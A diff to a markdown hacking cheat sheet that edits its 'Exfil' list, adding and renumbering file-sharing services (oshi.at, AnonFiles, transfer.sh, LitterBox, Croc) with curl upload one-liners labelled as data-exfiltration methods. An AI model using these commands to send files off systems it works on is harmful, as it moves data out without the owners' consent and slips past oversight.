@@ -1470,12 +1470,12 @@ Tunneling
 Exfil
 1. [Blitz](https://github.com/hackerschoice/gsocket#blitz) - `blitz -l` / `blitz foo.txt`
 1. [Mega](https://mega.io/cmd)
-1. ~~[BashUpload](https://bashupload.com/)~~
-2. [AnonFiles](https://www.anonfiles.com) - `curl -F "file=@test.txt" https://api.anonfiles.com/upload`
-3. [Transfer.sh](https://transfer.sh/) - `curl --upload-file foo.txt https://transfer.sh`
-4. [LitterBox](https://litterbox.catbox.moe/tools.php) - `curl -F reqtype=fileupload -F time=72h -F 'fileToUpload=@foo.txt' https://litterbox.catbox.moe/resources/internals/api.php`  
-5. [Croc](https://github.com/schollz/croc) - `croc send foo.txt / croc anit-price-example`
-6. [MagicWormhole](https://pypi.org/project/magic-wormhole/)
+2. https://oshi.at/ - also on TOR. `curl -T foo.txt https://oshi.at`
+4. [AnonFiles](https://www.anonfiles.com) - `curl -F "file=@foo.txt" https://api.anonfiles.com/upload`
+5. [Transfer.sh](https://transfer.sh/) - `curl -T foo.txt https://transfer.sh`
+6. [LitterBox](https://litterbox.catbox.moe/tools.php) - `curl -F reqtype=fileupload -F time=72h -F 'fileToUpload=@foo.txt' https://litterbox.catbox.moe/resources/internals/api.php`  
+7. [Croc](https://github.com/schollz/croc) - `croc send foo.txt / croc anit-price-example`
+8. [MagicWormhole](https://pypi.org/project/magic-wormhole/)
 
 Publishing
 1. [free BT/DC/eD2k seedbox](https://valdikss.org.ru/schare/)
